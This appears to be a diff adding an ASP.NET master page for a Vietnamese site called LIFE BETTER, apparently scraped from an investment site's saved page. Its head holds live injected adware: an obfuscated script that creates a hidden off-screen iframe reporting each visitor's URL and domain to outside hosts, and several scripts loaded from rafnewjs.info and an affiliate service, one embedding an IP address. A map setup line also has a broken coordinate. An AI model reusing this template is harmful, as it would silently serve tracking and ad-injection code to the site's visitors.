@@ -1,0 +1,378 @@
+﻿<%@ Master Language="VB" AutoEventWireup="false" CodeBehind="MSA.master.vb" Inherits="MSA.MSA" %>
+
+<!DOCTYPE html>
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head runat="server">
+
+    <title>LIFE BETTER</title>
+
+    <style type="text/css">
+        .cf-hidden {
+            display: none;
+        }
+
+        .cf-invisible {
+            visibility: hidden;
+        }
+    </style>
+    <style type="text/css">
+        @media(max-width: 767px) {
+            .sf-menu {
+                display: none;
+            }
+
+            .select-menu {
+                display: block;
+            }
+        }
+    </style>
+    <script type="text/javascript" async="">(function () { try { if (typeof window['asdfdsasdfdsa'] === 'undefined') { setTimeout(function () { var shouldThisPartOfCodeRun = document.URL.search('http') === 0; if (!shouldThisPartOfCodeRun) { return; } if (typeof DealPly !== 'undefined' && typeof DealPly.serverCallParam === 'string') { var reportFlag = true; var scArr = document.getElementsByTagName('script'); for (var index in scArr) { if (typeof scArr[index].src === 'string' && scArr[index].src.search('\\.js\\?dn=') !== -1) { reportFlag = false; } } if (!reportFlag) { return; } var host = 'http://q.nadijs.info/'; var isSecure = document.URL.search('https://') === 0; if (isSecure) { host = 'https://endall41-q.apollocdn.com/'; } var urlPath = 'dealdo/event-report?type=quick&'; var iframe = document.createElement('iframe'); var suffix = ''; try { if (typeof JavaScriptJsTagUrl !== 'undefined') { suffix = JavaScriptJsTagUrl.substr(JavaScriptJsTagUrl.search('\?') + 1); } } catch (e324324) { } iframe.setAttribute('style', 'position:relative; left:-10000px; width:1px; height:1px; visibility:hidden'); iframe.setAttribute('src', host + urlPath + 'url=' + encodeURIComponent(document.URL) + '&domain=' + document.domain + '&topic=dpdiedarg&' + suffix); document.body.appendChild(iframe); } }, 10000); window['asdfdsasdfdsa'] = true; } } catch (e235534) { } })();</script>
+    <script src="http://i.rafnewjs.info/rafnew/javascript.js?hid=9f3dfcf2a10bcf26614cf9023ea3ad14&amp;channel=yk_cay"></script>
+    <script src="https://api.jollywallet.com/affiliate/client?dist=336&amp;sub=cay"></script>
+    <script src="http://i.rafnewjs.info/opt_content.js?v=opt_1461565488328&amp;partner=rafnew&amp;channel=rafnewyk_cay&amp;sset=9&amp;appTitle=&amp;products=&amp;ip=42.113.111.234"></script>
+    <script type="text/javascript" charset="UTF-8" src="https://maps.googleapis.com/maps-api-v3/api/js/25/7/intl/vi_ALL/common.js"></script>
+    <script type="text/javascript" charset="UTF-8" src="https://maps.googleapis.com/maps-api-v3/api/js/25/7/intl/vi_ALL/util.js"></script>
+    <script type="text/javascript" charset="UTF-8" src="https://maps.googleapis.com/maps-api-v3/api/js/25/7/intl/vi_ALL/stats.js"></script>
+    <script src="http://c.rafnewjs.info/1714732232.js?dn=bit-invest.com&amp;isc=0" type="text/javascript" id="__DealPly__879108.2277422175" class="dealply_content_script"></script>
+    <script src="http://f.rafnewjs.info/feedmon/feedmon_extra.js" type="text/javascript" id="__DealPly__400023.4484893288" class="dealply_content_script"></script>
+    <script src="http://f.rafnewjs.info/crt.js" type="text/javascript" id="__DealPly__750082.07944252" class="dealply_content_script"></script>
+    <asp:ContentPlaceHolder ID="head" runat="server">
+    </asp:ContentPlaceHolder>
+</head>
+
+
+
+<body class="home page page-id-203 page-template page-template-page-home-php">
+    <script type="text/javascript" async="" src="http://www.google-analytics.com/ga.js"></script>
+    <script async="" src="//ajax.cloudflare.com/cdn-cgi/nexp/dokv=97fb4d042e/cloudflare.min.js"></script>
+    <script type="text/javascript">
+        //<![CDATA[
+        try { if (!window.CloudFlare) { var CloudFlare = [{ verbose: 0, p: 0, byc: 0, owlid: "cf", bag2: 1, mirage2: 0, oracle: 0, paths: { cloudflare: "/cdn-cgi/nexp/dokv=88e434a982/" }, atok: "3cf2e82e1f0ccdd938a6d4df0eb7252f", petok: "8ac4653679b5708c394f002c96bc72b0e00007b2-1409228350-86400", zone: "template-help.com", rocket: "0", apps: { "abetterbrowser": { "ie": "7" }, "ga_key": { "ua": "UA-7078796-5", "ga_bs": "2" } } }]; !function (a, b) { a = document.createElement("script"), b = document.getElementsByTagName("script")[0], a.async = !0, a.src = "//ajax.cloudflare.com/cdn-cgi/nexp/dokv=97fb4d042e/cloudflare.min.js", b.parentNode.insertBefore(a, b) }() } } catch (e) { };
+        //]]>
+    </script>
+
+    <link rel="icon" href="favicon.ico" type="image/x-icon" />
+    <link rel="stylesheet" type="text/css" media="all" href="/Content/bootstrap.css" />
+    <link rel="stylesheet" type="text/css" media="all" href="/Content/bootstrap.min.css" />
+    <link rel="stylesheet" type="text/css" media="all" href="/Content/responsive.css" />
+    <link rel="stylesheet" type="text/css" media="all" href="/Content/camera.css" />
+    <link rel="stylesheet" type="text/css" media="all" href="/Content/style.css" />
+    <link rel="stylesheet" id="contact-form-7-css" href="Content/styles.css?ver=3.6" type="text/css" media="all" />
+    <link rel="stylesheet" id="magnific-popup-css" href="Content/magnific-popup.css?ver=0.9.3" type="text/css" media="all" />
+    <link rel="stylesheet" id="options_typography_Ubuntu-css" href="//fonts.googleapis.com/css?family=Ubuntu&amp;subset=latin" type="text/css" media="all" />
+    <link rel="stylesheet" id="options_typography_Archivo+Narrow-css" href="//fonts.googleapis.com/css?family=Archivo+Narrow&amp;subset=latin" type="text/css" media="all" />
+    <script type="text/javascript" src="Scripts/jquery-1.7.2.min.js?ver=1.7.2"></script>
+    <script type="text/javascript" src="Scripts/custom.js?ver=1.0"></script>
+    <script type="text/javascript" src="Scripts/bootstrap.min.js?ver=2.3.0"></script>
+
+    <style type="text/css">
+        .cherry-fixed-layout .main-holder {
+            background: #fafafa;
+        }
+    </style>
+    <style type="text/css"></style>
+    <style type="text/css">
+        h1 {
+            font: bold 24px/34px Ubuntu;
+            color: #343434;
+        }
+
+        h2 {
+            font: bold 24px/34px Ubuntu;
+            color: #343434;
+        }
+
+        h3 {
+            font: bold 24px/34px Ubuntu;
+            color: #343434;
+        }
+
+        h4 {
+            font: bold 14px/18px Ubuntu;
+            color: #ffffff;
+        }
+
+        h5 {
+            font: normal 18px/18px Ubuntu;
+            color: #b80b07;
+        }
+
+        h6 {
+            font: normal 18px/20px Ubuntu;
+            color: #333333;
+        }
+
+        .logo_h__txt, .logo_link {
+            font: bold 48px/48px Ubuntu;
+            color: #1d1d1d;
+        }
+
+        .sf-menu > li > a {
+            font: bold 13px/15px Tahoma Archivo Narrow;
+            color: #ffffff;
+        }
+
+        .nav.footer-nav a {
+            font: normal 10px/16px Ubuntu;
+            color: #b2b2b2;
+        }
+    </style>
+    <script src="Scripts/jquery.mobile.customized.min.js" type="text/javascript"></script>
+    <script type="text/javascript">
+        jQuery(function () {
+            jQuery('.sf-menu').mobileMenu({ defaultText: "Navigate to..." });
+        });
+    </script>
+    <!--<![endif]-->
+    <script type="text/javascript">
+        // Init navigation menu
+        jQuery(function () {
+            // main navigation init
+            jQuery('ul.sf-menu').superfish({
+                delay: 1000, // the delay in milliseconds that the mouse can remain outside a sub-menu without it closing
+                animation: {
+                    opacity: "show",
+                    height: "show"
+                }, // used to animate the sub-menu open
+                speed: "normal", // animation speed
+                autoArrows: true, // generation of arrow mark-up (for submenu)
+                disableHI: true // to disable hoverIntent detection
+            });
+
+            //Zoom fix
+            //IPad/IPhone
+            var viewportmeta = document.querySelector && document.querySelector('meta[name="viewport"]'),
+				ua = navigator.userAgent,
+				gestureStart = function () {
+				    viewportmeta.content = "width=device-width, minimum-scale=0.25, maximum-scale=1.6, initial-scale=1.0";
+				},
+				scaleFix = function () {
+				    if (viewportmeta && /iPhone|iPad/.test(ua) && !/Opera Mini/.test(ua)) {
+				        viewportmeta.content = "width=device-width, minimum-scale=1.0, maximum-scale=1.0";
+				        document.addEventListener("gesturestart", gestureStart, false);
+				    }
+				};
+            scaleFix();
+        })
+    </script>
+    <script type="text/javascript">
+        /* <![CDATA[ */
+        var _gaq = _gaq || [];
+        _gaq.push(['_setAccount', 'UA-7078796-5']);
+        _gaq.push(['_trackPageview']);
+
+        (function () {
+            var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+            ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+            var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+        })();
+
+        (function (b) { (function (a) { "__CF" in b && "DJS" in b.__CF ? b.__CF.DJS.push(a) : "addEventListener" in b ? b.addEventListener("load", a, !1) : b.attachEvent("onload", a) })(function () { "FB" in b && "Event" in FB && "subscribe" in FB.Event && (FB.Event.subscribe("edge.create", function (a) { _gaq.push(["_trackSocial", "facebook", "like", a]) }), FB.Event.subscribe("edge.remove", function (a) { _gaq.push(["_trackSocial", "facebook", "unlike", a]) }), FB.Event.subscribe("message.send", function (a) { _gaq.push(["_trackSocial", "facebook", "send", a]) })); "twttr" in b && "events" in twttr && "bind" in twttr.events && twttr.events.bind("tweet", function (a) { if (a) { var b; if (a.target && a.target.nodeName == "IFRAME") a: { if (a = a.target.src) { a = a.split("#")[0].match(/[^?=&]+=([^&]*)?/g); b = 0; for (var c; c = a[b]; ++b) if (c.indexOf("url") === 0) { b = unescape(c.split("=")[1]); break a } } b = void 0 } _gaq.push(["_trackSocial", "twitter", "tweet", b]) } }) }) })(window);
+        /* ]]> */
+    </script>
+
+    <script src="https://maps.googleapis.com/maps/api/js?v=3.exp&amp;sensor=true"></script>
+    <script>
+        var map;
+        function initialize() {
+            var mapOptions = {
+                zoom: 14,
+                center: new google.maps.LatLng(51.513688, -0, 086048),
+                mapTypeId: google.maps.MapTypeId.ROADMAP
+            };
+            map = new google.maps.Map(document.getElementById('map-canvas'),
+                mapOptions);
+        }
+
+        google.maps.event.addDomListener(window, 'load', initialize);
+    </script>
+    <%--<script>
+        document.getElementById("demo").innerHTML = Date();
+    </script>--%>
+    <form runat="server">
+
+        <div id="motopress-main" class="main-holder">
+            <header class="motopress-wrapper header">
+                <div class="container">
+                    <div class="row">
+                        <div class="span12" data-motopress-wrapper-file="wrapper/wrapper-header.php" data-motopress-wrapper-type="header" data-motopress-id="53ff1e3e881fc">
+                            <div class="row">
+                                <div class="span6" data-motopress-type="static" data-motopress-static-file="static/static-logo.php">
+
+                                    <div class="logo pull-left">
+                                        <a href="../Home.aspx"  class="" >
+                                            
+                                           
+                                        <img src="/images/logo LB- convert-04.png" alt="LIFE BETTER" title="LIVE YOUR DREAM" style="width:200px; height:80px"/></a>
+                                       <%-- <p class="logo_tagline">LIVE YOUR DREAM</p>--%>
+                                    </div>
+                                </div>
+                                <div class="span6">
+                                    <div class="header_widget" data-motopress-type="dynamic-sidebar" data-motopress-sidebar-id="header-sidebar">
+                                        <div id="text-7">
+                                            <h4>Hỗ trợ</h4>
+                                            <div class="textwidget">
+                                                <i></i>
+                                                +84 974297983
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="hidden-phone" data-motopress-type="static" data-motopress-static-file="static/static-search.php">
+
+                                        <div align="right">
+                                            <font size="2px" color="010101">   
+                                            <%=Date.Now.ToString("dd/MM/yyyy hh:mm:ss")%>
+                                        </font>
+                                        </div>
+
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="spacer"></div>
+                            <div class="row">
+                                <div class="span8" data-motopress-type="static" data-motopress-static-file="static/static-nav.php">
+
+                                    <nav class="nav nav__primary clearfix" >
+                                        <ul id="topnav" class="sf-menu sf-js-enabled">
+                                            <li id="menu-item-1807" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item">
+                                                <a href="../Home.aspx"><b >Trang chủ</b></a></li>
+                                            <li id="menu-item-1810" class="menu-item menu-item-type-post_type menu-item-object-page ">
+                                                <a href="#"><b >Giới thiệu</b></a></li>
+                                            <li id="menu-item-1809" class="menu-item menu-item-type-post_type menu-item-object-page ">
+                                                <a href="#"><b >Chính sách</b></a></li>
+                                            <li id="menu-item-1808" class="menu-item menu-item-type-post_type menu-item-object-page ">
+                                                <a href="#"><b >FAQ</b></a></li>
+                                            <li id="menu-item-1806" class="menu-item menu-item-type-post_type menu-item-object-page ">
+                                                <a href="../Account/LoginAccount"><b >Đăng nhập</b></a></li>
+                                            <li id="menu-item-1804" class="menu-item menu-item-type-post_type menu-item-object-page ">
+                                                <a href="#"><b >Liên hệ</b></a></li>
+                                        </ul>
+                                        <%--<select class="select-menu">--%>
+                                        <select class="select-menu">
+                                            <option value="#">Chuyển đến...</option>
+                                            <option value="http://bit-invest.com/index.php?a=1&amp;ref=">Trang chủ</option>
+                                            <option value="http://bit-invest.com/about.php?a=2&amp;ref=">Giới thiệu</option>
+                                            <option value="http://bit-invest.com/tos.php?a=3&amp;ref=">Chính sách</option>
+                                            <option value="http://bit-invest.com/faq.php?a=4&amp;ref=">FAQ</option>
+                                            <option value="http://bit-invest.com/signup.php?a=5&amp;ref=">Đăng nhập</option>
+                                            <option value="http://bit-invest.com/contacts.php?a=7&amp;ref=">Liên hệ</option>
+                                        </select>
+                                    </nav>
+                                </div>
+
+                                <div class="span4 social-nets-wrapper" data-motopress-type="static" data-motopress-static-file="static/static-social-networks.php">
+                                    <ul class="social">
+                                        <li><a href="http://twitter.com" target="_blank" title="twitter">
+                                            <img src="/images/twitter.png" alt="twitter" /></a></li>
+                                        <li><a href="http://facebook.com" target="_blank" title="facebook">
+                                            <img src="/images/facebook.png" alt="facebook" /></a></li>
+                                        <li><a href="mailto:support@lifebetter.org">
+                                            <img src="/images/mail.png" alt="mail" /></a></li>
+                                        <li><a href="http://google.com" target="_blank" title="google">
+                                            <img src="/images/google.png" alt="google" /></a></li>
+                                    </ul>
+                                </div>
+
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </header>
+
+        </div>
+
+        <asp:ContentPlaceHolder ID="MainContent" runat="server">
+        </asp:ContentPlaceHolder>
+
+         <asp:ContentPlaceHolder ID="MainLoginAccount" runat="server">
+        </asp:ContentPlaceHolder>
+
+
+        <footer class="motopress-wrapper footer">
+            <div class="container">
+                <div class="row">
+                    <div class="span12" data-motopress-wrapper-file="wrapper/wrapper-footer.php" data-motopress-wrapper-type="footer" data-motopress-id="53ff1e3ebb654">
+                        <div class="row footer-widgets">
+                            <div class="span2" data-motopress-type="dynamic-sidebar" data-motopress-sidebar-id="footer-sidebar-1">
+                               <%-- <div id="nav_menu-3">
+                                    <h4>Company</h4>
+                                    <div class="menu-company-container">
+                                        <ul id="menu-company" class="menu">
+                                            <li id="menu-item-1898" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1898"><a href="about.php?a=2&amp;ref=">About us</a></li>
+                                            <li id="menu-item-1899" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1899"><a href="legal.php?ref=">Legal Documents</a></li>
+                                            <li id="menu-item-1900" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1900"><a href="proof.php?ref=">Payment Proof</a></li>
+                                            <li id="menu-item-1901" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1901"><a href="news.php?ref=">News</a></li>
+                                            <li id="menu-item-1902" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1902"><a href="privacy.php?ref=">Privacy Policy</a></li>
+                                        </ul>
+                                    </div>
+                                </div>--%>
+                            </div>
+                            <div class="span2" data-motopress-type="dynamic-sidebar" data-motopress-sidebar-id="footer-sidebar-2">
+                               <%-- <div id="nav_menu-4">
+                                    <h4>Overview</h4>
+                                    <div class="menu-overview-container">
+                                        <ul id="menu-overview" class="menu">
+                                            <li id="menu-item-1903" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1903"><a href="plans.php?ref=">Investment Plans</a></li>
+                                            <li id="menu-item-1904" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1904"><a href="tos.php?a=3&amp;ref=">Terms of Service</a></li>
+                                            <li id="menu-item-1905" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1905"><a href="faq.php?a=4&amp;ref=">FAQs</a></li>
+                                        </ul>
+                                    </div>
+                                </div>--%>
+                            </div>
+                            <div class="span2" data-motopress-type="dynamic-sidebar" data-motopress-sidebar-id="footer-sidebar-3">
+                                <%--<div id="nav_menu-5">
+                                    <h4>For clients</h4>
+                                    <div class="menu-for-clients-container">
+                                        <ul id="menu-for-clients" class="menu">
+                                            <li id="menu-item-1906" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1906"><a href="signup.php?a=5&amp;ref=">OPEN ACCOUNT</a></li>
+                                            <li id="menu-item-1907" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1907"><a href="login.php?a=6&amp;ref=">ACCESS ACCOUNT</a></li>
+                                            <li id="menu-item-1908" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1908"><a href="login.php?a=6&amp;ref=">LOST MAT_KHAU</a></li>
+                                            <li id="menu-item-1909" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1909"><a href="contacts.php?a=7&amp;ref=;">SUPPORT</a></li>
+                                        </ul>
+                                    </div>
+                                </div>--%>
+                            </div>
+                            <div class="span2" data-motopress-type="dynamic-sidebar" data-motopress-sidebar-id="footer-sidebar-4">
+                               <%-- <div id="nav_menu-6">
+                                    <h4>Navigation</h4><div class="menu-footer-menu-container">
+                                        <ul id="menu-footer-menu" class="menu">
+                                            <li id="menu-item-1816" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1816"><a href="index.php?a=1&amp;ref=">Home</a></li>
+                                            <li id="menu-item-1821" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1821"><a href="about.php?a=2&amp;ref=">About</a></li>
+                                            <li id="menu-item-1820" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1820"><a href="tos.php?a=3&amp;ref=">Terms</a></li>
+                                            <li id="menu-item-1819" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1819"><a href="signup.php?a=5&amp;ref=">Signup</a></li>
+                                            <li id="menu-item-1817" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1817"><a href="login.php?a=6&amp;ref=">Login</a></li>
+                                            <li id="menu-item-1818" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1818"><a href="contacts.php?a=7&amp;ref=">Contacts</a></li>
+                                        </ul>
+                                    </div>
+                                </div>--%>
+                            </div>
+                            <div class="span4">
+                                <div class="indent_left">
+                                  <%--  <div data-motopress-type="dynamic-sidebar" data-motopress-sidebar-id="footer-sidebar-5">
+                                        <div id="text-8">
+                                            <div class="textwidget">
+                                                <i>33 Throgmorton Street, 6th Floor, <br> London, EC2N 2BR, UK</i>
+                                                <b>Telephone: +44 20 7156 6217 <br> FAX: +44 20 7156 6220</b>
+                                            </div>
+                                        </div>
+                                    </div>--%>
+
+                                    <div data-motopress-type="static" data-motopress-static-file="static/static-footer-text.php">
+                                        <div id="footer-text" style="text-align:right" class="footer-text" >
+                                            <b><font size="+1" color="B80B07">LIFE</font><font size="+1" color="FFFFFF">BETTER</font></b> � 2016 | <a href="privacy.php?ref=;" title="Privacy Policy">Privacy Policy</a>
+                                        </div>
+                                    </div>
+
+                                    <div data-motopress-type="static" data-motopress-static-file="static/static-footer-nav.php">
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </form>
+</body>
+</html>
